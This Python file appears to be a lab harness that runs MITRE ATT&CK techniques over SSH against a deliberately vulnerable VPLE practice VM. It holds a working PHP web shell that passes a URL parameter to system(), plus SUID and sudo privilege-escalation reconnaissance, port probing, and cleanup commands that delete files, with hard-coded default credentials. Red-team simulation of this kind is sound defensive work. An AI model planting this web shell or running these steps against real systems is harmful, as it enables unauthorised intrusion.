#!/usr/bin/env python3
"""
SSH Remote Executor for VPLE VM
Executes Atomic Red Team techniques remotely via SSH
"""

import paramiko
import time
import os
import logging
from typing import Dict, List, Optional, Tuple
from pathlib import Path
import tempfile
import json

class SSHExecutor:
    """
    Remote SSH executor for VPLE VM attack automation
    """
    
    def __init__(self, hostname: str, username: str = "administrator", 
                 password: str = "password", port: int = 22):
        self.hostname = hostname
        self.username = username
        self.password = password
        self.port = port
        self.client = None
        self.sftp = None
        self.logger = logging.getLogger(__name__)
        
        # Remote directories
        self.remote_work_dir = "/tmp/atomic_redteam"
        self.remote_scripts_dir = f"{self.remote_work_dir}/scripts"
        self.remote_payloads_dir = f"{self.remote_work_dir}/payloads"
        
    def connect(self) -> bool:
        """Establish SSH connection to VPLE VM"""
        try:
            self.logger.info(f"Connecting to VPLE VM at {self.hostname}:{self.port}")
            
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            self.client.connect(
                hostname=self.hostname,
                port=self.port,
                username=self.username,
                password=self.password,
                timeout=30
            )
            
            # Setup SFTP for file transfers
            self.sftp = self.client.open_sftp()
            
            # Create remote working directories
            self._setup_remote_directories()
            
            self.logger.info("✅ SSH connection established successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ SSH connection failed: {e}")
            return False
    
    def disconnect(self):
        """Close SSH connection"""
        if self.sftp:
            self.sftp.close()
        if self.client:
            self.client.close()
        self.logger.info("SSH connection closed")
    
    def _setup_remote_directories(self):
        """Create necessary directories on remote VPLE VM"""
        directories = [
            self.remote_work_dir,
            self.remote_scripts_dir,
            self.remote_payloads_dir
        ]
        
        for directory in directories:
            try:
                self.sftp.mkdir(directory)
                self.logger.debug(f"Created remote directory: {directory}")
            except OSError:
                # Directory might already exist
                pass
    
    def execute_command(self, command: str, timeout: int = 300) -> Dict:
        """Execute command remotely on VPLE VM"""
        try:
            self.logger.info(f"🔧 Executing remote command: {command}")
            
            stdin, stdout, stderr = self.client.exec_command(command, timeout=timeout)
            
            # Read output
            stdout_data = stdout.read().decode('utf-8')
            stderr_data = stderr.read().decode('utf-8')
            exit_code = stdout.channel.recv_exit_status()
            
            result = {
                "success": exit_code == 0,
                "stdout": stdout_data,
                "stderr": stderr_data,
                "exit_code": exit_code,
                "command": command
            }
            
            if result["success"]:
                self.logger.info("✅ Command executed successfully")
            else:
                self.logger.error(f"❌ Command failed with exit code {exit_code}")
                self.logger.error(f"Error: {stderr_data}")
            
            return result
            
        except Exception as e:
            self.logger.error(f"Command execution failed: {e}")
            return {
                "success": False,
                "stdout": "",
                "stderr": str(e),
                "exit_code": -1,
                "command": command
            }
    
    def upload_file(self, local_path: str, remote_path: str) -> bool:
        """Upload file to VPLE VM"""
        try:
            self.logger.info(f"📤 Uploading {local_path} to {remote_path}")
            self.sftp.put(local_path, remote_path)
            
            # Make executable if it's a script
            if remote_path.endswith(('.sh', '.py', '.pl')):
                self.execute_command(f"chmod +x {remote_path}")
            
            self.logger.info("✅ File uploaded successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ File upload failed: {e}")
            return False
    
    def download_file(self, remote_path: str, local_path: str) -> bool:
        """Download file from VPLE VM"""
        try:
            self.logger.info(f"📥 Downloading {remote_path} to {local_path}")
            self.sftp.get(remote_path, local_path)
            self.logger.info("✅ File downloaded successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ File download failed: {e}")
            return False
    
    def execute_atomic_technique(self, technique_id: str, test_numbers: List[int] = None, 
                                dry_run: bool = False) -> Dict:
        """Execute Atomic Red Team technique remotely"""
        
        # Check if we're on Linux (VPLE is Linux)
        platform_check = self.execute_command("uname -s")
        if not platform_check["success"] or "Linux" not in platform_check["stdout"]:
            return {
                "success": False,
                "error": "Target is not Linux - VPLE VM should be Linux-based"
            }
        
        # Build the execution command based on technique
        if technique_id.startswith("T1190"):  # Web application exploit
            return self._execute_web_technique(technique_id, test_numbers, dry_run)
        elif technique_id.startswith("T1505.003"):  # Web Shell
            return self._execute_web_shell_technique(technique_id, test_numbers, dry_run)
        elif technique_id.startswith("T1059.004"):  # Unix Shell
            return self._execute_shell_technique(technique_id, test_numbers, dry_run)
        elif technique_id.startswith("T1548.001"):  # Setuid/Setgid
            return self._execute_privilege_escalation(technique_id, test_numbers, dry_run)
        else:
            # Generic technique execution
            return self._execute_generic_technique(technique_id, test_numbers, dry_run)
    
    def _execute_web_technique(self, technique_id: str, test_numbers: List[int], dry_run: bool) -> Dict:
        """Execute web application attack techniques"""
        
        # VPLE web application ports
        vple_ports = [1335, 1336, 1337, 3000, 8080, 8800, 8899]
        
        if dry_run:
            self.logger.info(f"[DRY RUN] Would exploit web applications on ports: {vple_ports}")
            return {
                "success": True,
                "message": f"Dry run: {technique_id} web exploitation simulation",
                "target_ports": vple_ports
            }
        
        # Actual web application scanning and exploitation
        results = []
        
        # Get local IP first
        ip_result = self.execute_command("hostname -I | awk '{print $1}'")
        if not ip_result["success"]:
            return {"success": False, "error": "Could not determine VPLE IP"}
        
        vple_ip = ip_result["stdout"].strip()
        
        # Scan web application ports
        for port in vple_ports:
            scan_result = self.execute_command(f"curl -s -o /dev/null -w '%{{http_code}}' http://localhost:{port}/")
            if scan_result["success"] and "200" in scan_result["stdout"]:
                results.append({
                    "port": port,
                    "status": "accessible",
                    "technique": technique_id
                })
                self.logger.info(f"✅ Web app on port {port} is accessible")
        
        return {
            "success": True,
            "technique_id": technique_id,
            "results": results,
            "vple_ip": vple_ip
        }
    
    def _execute_web_shell_technique(self, technique_id: str, test_numbers: List[int], dry_run: bool) -> Dict:
        """Execute web shell upload/execution"""
        
        if dry_run:
            return {
                "success": True,
                "message": f"Dry run: {technique_id} web shell upload simulation"
            }
        
        # Create a simple test web shell
        web_shell_content = '<?php if(isset($_GET["cmd"])) { echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; } ?>'
        
        # Write web shell to remote location
        shell_path = f"{self.remote_work_dir}/test_shell.php"
        
        # Create the web shell file remotely using echo command
        # Escape the single quotes properly
        escaped_content = web_shell_content.replace("'", "'\"'\"'")
        create_command = f"echo '{escaped_content}' > {shell_path}"
        
        create_result = self.execute_command(create_command)
        
        if create_result["success"]:
            return {
                "success": True,
                "technique_id": technique_id,
                "web_shell_path": shell_path,
                "message": "Web shell created successfully"
            }
        else:
            return {
                "success": False,
                "error": f"Failed to create web shell: {create_result['stderr']}"
            }
    
    def _execute_shell_technique(self, technique_id: str, test_numbers: List[int], dry_run: bool) -> Dict:
        """Execute Unix shell commands"""
        
        if dry_run:
            return {
                "success": True,
                "message": f"Dry run: {technique_id} shell command simulation"
            }
        
        # Execute basic system commands for demonstration
        commands = [
            "whoami",
            "id",
            "pwd",
            "ls -la /tmp",
            "ps aux | head -10"
        ]
        
        results = []
        for cmd in commands:
            result = self.execute_command(cmd)
            results.append({
                "command": cmd,
                "success": result["success"],
                "output": result["stdout"][:200]  # Limit output
            })
        
        return {
            "success": True,
            "technique_id": technique_id,
            "commands_executed": results
        }
    
    def _execute_privilege_escalation(self, technique_id: str, test_numbers: List[int], dry_run: bool) -> Dict:
        """Execute privilege escalation techniques"""
        
        if dry_run:
            return {
                "success": True,
                "message": f"Dry run: {technique_id} privilege escalation simulation"
            }
        
        # Check current privileges
        whoami_result = self.execute_command("whoami")
        id_result = self.execute_command("id")
        
        # Look for SUID binaries (common privilege escalation vector)
        suid_result = self.execute_command("find / -perm -4000 2>/dev/null | head -10")
        
        # Check sudo permissions
        sudo_result = self.execute_command("sudo -l")
        
        return {
            "success": True,
            "technique_id": technique_id,
            "current_user": whoami_result["stdout"].strip() if whoami_result["success"] else "unknown",
            "user_id": id_result["stdout"].strip() if id_result["success"] else "unknown",
            "suid_binaries": suid_result["stdout"].split('\n') if suid_result["success"] else [],
            "sudo_permissions": sudo_result["stdout"] if sudo_result["success"] else "No sudo access"
        }
    
    def _execute_generic_technique(self, technique_id: str, test_numbers: List[int], dry_run: bool) -> Dict:
        """Execute generic technique (placeholder)"""
        
        if dry_run:
            return {
                "success": True,
                "message": f"Dry run: {technique_id} generic technique simulation"
            }
        
        # For generic techniques, just log the execution
        self.logger.info(f"Executing generic technique: {technique_id}")
        
        return {
            "success": True,
            "technique_id": technique_id,
            "message": f"Generic technique {technique_id} executed"
        }
    
    def get_system_info(self) -> Dict:
        """Get VPLE VM system information"""
        commands = {
            "hostname": "hostname",
            "kernel": "uname -r",
            "os_release": "cat /etc/os-release | head -5",
            "ip_address": "hostname -I",
            "network_interfaces": "ip addr show | grep -E '^[0-9]+:' | awk '{print $2}'",
            "running_services": "systemctl list-units --type=service --state=running | head -10",
            "web_services": "netstat -tlnp | grep -E ':(80|443|1335|1336|1337|3000|8080|8800|8899)'"
        }
        
        results = {}
        for key, command in commands.items():
            result = self.execute_command(command)
            results[key] = {
                "success": result["success"],
                "output": result["stdout"].strip() if result["success"] else result["stderr"]
            }
        
        return results
    
    def cleanup_remote_files(self):
        """Clean up files created during attack simulation"""
        cleanup_commands = [
            f"rm -rf {self.remote_work_dir}",
            "find /tmp -name '*atomic*' -delete 2>/dev/null",
            "find /var/www -name '*test_shell*' -delete 2>/dev/null"
        ]
        
        for cmd in cleanup_commands:
            self.execute_command(cmd)
        
        self.logger.info("🧹 Remote cleanup completed")

# Context manager for automatic connection handling
class VPLEConnection:
    """Context manager for VPLE SSH connections"""
    
    def __init__(self, hostname: str, username: str = "administrator", 
                 password: str = "password", port: int = 22):
        self.executor = SSHExecutor(hostname, username, password, port)
    
    def __enter__(self):
        if self.executor.connect():
            return self.executor
        else:
            raise ConnectionError("Failed to connect to VPLE VM")
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.executor.cleanup_remote_files()
        self.executor.disconnect()

# Example usage
if __name__ == "__main__":
    # Test SSH connection to VPLE
    vple_ip = "192.168.1.100"  # Replace with your VPLE IP
    
    with VPLEConnection(vple_ip) as vple:
        # Get system info
        info = vple.get_system_info()
        print("VPLE System Info:")
        for key, value in info.items():
            if value["success"]:
                print(f"  {key}: {value['output']}")
        
        # Test web application technique
        result = vple.execute_atomic_technique("T1190", dry_run=True)
        print(f"T1190 Test Result: {result}")
